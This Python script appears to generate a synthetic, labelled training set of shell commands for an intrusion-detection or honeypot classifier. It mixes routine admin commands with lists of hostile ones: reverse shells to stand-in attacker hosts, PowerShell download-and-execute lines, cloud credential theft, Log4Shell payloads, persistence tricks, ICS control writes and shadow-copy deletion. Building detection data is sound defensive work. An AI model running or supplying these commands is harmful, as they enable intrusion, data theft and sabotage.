import pandas as pd
import random
import datetime

def generate_titan_v3_vector(category):
    timestamp = datetime.datetime.now().isoformat()
    src_ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    
    # TITAN V3: Global A-Z Adversary Tactics (Reinforced)
    vectors = {
        'Normal_Business_Ops': [
            'git commit -m "update dashboard"', 'npm start', 'pip install requests',
            'ls -lha /var/www/html', 'sudo systemctl restart nginx', 'docker-compose up -d',
            'kubectl get services --all-namespaces', 'ssh admin@10.0.0.5', 'tail -f /var/log/syslog',
            'grep "error" application.log', 'ps -ef | grep python', 'df -h', 'uptime',
            'cat /etc/resolv.conf', 'netstat -tulpn', 'history | tail -n 20', 'whoami',
            'curl https://google.com', 'ping -c 4 8.8.8.8', 'make build', 'go run main.go',
            'git add .', 'git push origin main', 'git pull', 'git fetch origin main', 'git branch',
            'vi /etc/nginx/nginx.conf', 'systemctl status docker', 'journalctl -u ssh.service'
        ],
        'Cloud_&_Container_Exploit': [
            'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role',
            'kubectl get secrets --all-namespaces -o json',
            'docker run -it --rm -v /:/host/ root/ubuntu chroot /host/',
            'aws s3 sync s3://company-private-bucket ./stolen-data',
            'az account get-access-token --resource https://management.azure.com/',
            'curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'cat /run/secrets/kubernetes.io/serviceaccount/token'
        ],
        'Advanced_Persistence_&_LotL': [
            'powershell.exe -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://bad.io\')"',
            'bitsadmin /transfer myJob http://bad.com/payload.exe C:\\temp\\p.exe',
            'schtasks /create /sc minute /mo 1 /tn "SystemUpdate" /tr "C:\\temp\\backdoor.exe"',
            'echo "*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/attacker.com/80 0>&1\'" | crontab -',
            'chattr +i /home/user/.ssh/authorized_keys',
            'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\\temp\\s.ps1',
            'powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://bad.io\')"'
        ],
        'Advanced_RCE_&_C2': [
            'bash -c "exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done"',
            'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443',
            'python3 -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'1.2.3.4\',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/bash\')"',
            'sh -i >& /dev/tcp/attacker.xyz/443 0>&1',
            'bash -i >& /dev/tcp/1.2.3.4/8080 0>&1',
            'nc -lvp 4444 -e /bin/sh',
            'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",-i\"]);"'
        ],
        'Critical_Infrastructure_ICS': [
            'modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000',
            'modbus_write_register 502 1 65535',
            's7_comm_stop_cpu_all', 'bacnet_scan --target 192.168.1.0/24',
            'ethernet_ip_request --service 0x4C --class 0x67',
            'set_pump_speed 10000 --force'
        ],
        'Supply_Chain_&_Log4Shell': [
            '${jndi:ldap://attacker.cloud/exploit}',
            '${jndi:rmi://attacker.cloud/a}',
            '${jndi:dns://attacker.cloud/a}',
            '$(curl -s http://attacker.com/$(whoami))',
            '{{7*7}}',
            '{"__proto__": {"polluted": true}}'
        ],
        'Ransomware_Prep': [
            'vssadmin delete shadows /all /quiet',
            'wmic shadowcopy delete',
            'vssadmin.exe delete shadows /all /quiet',
            'cipher /w:C:\\',
            'tar -czvf - /etc/ | nc attacker.host 9999',
            'openssl enc -aes-256-cbc -in production.db -out production.db.enc'
        ]
    }
    
    label = category if category in vectors else 'Normal_Business_Ops'
    cmd = random.choice(vectors[label])
    
    return {
        'timestamp': timestamp,
        'src_ip': src_ip,
        'input': cmd,
        'label': label
    }

def main():
    data = []
    # REINFORCED TITAN V3 DATASET (12,000 SAMPLES)
    categories = {
        'Normal_Business_Ops': 4000, # Increased for baseline confidence
        'Cloud_&_Container_Exploit': 1200,
        'Advanced_Persistence_&_LotL': 1400,
        'Advanced_RCE_&_C2': 1800,
        'Critical_Infrastructure_ICS': 1200,
        'Supply_Chain_&_Log4Shell': 1200,
        'Ransomware_Prep': 1200
    }
    
    for category, count in categories.items():
        for _ in range(count):
            data.append(generate_titan_v3_vector(category))
        
    df = pd.DataFrame(data)
    df = df.sample(frac=1).reset_index(drop=True)
    
    output_file = 'e:/projects antigrav/honey/data_processing/training_data.csv'
    df.to_csv(output_file, index=False)
    print(f"FORGESENTRY TITAN V3: Enterprise Dataset Reinforced & Hardened (12,000 Samples).")

if __name__ == "__main__":
    main()
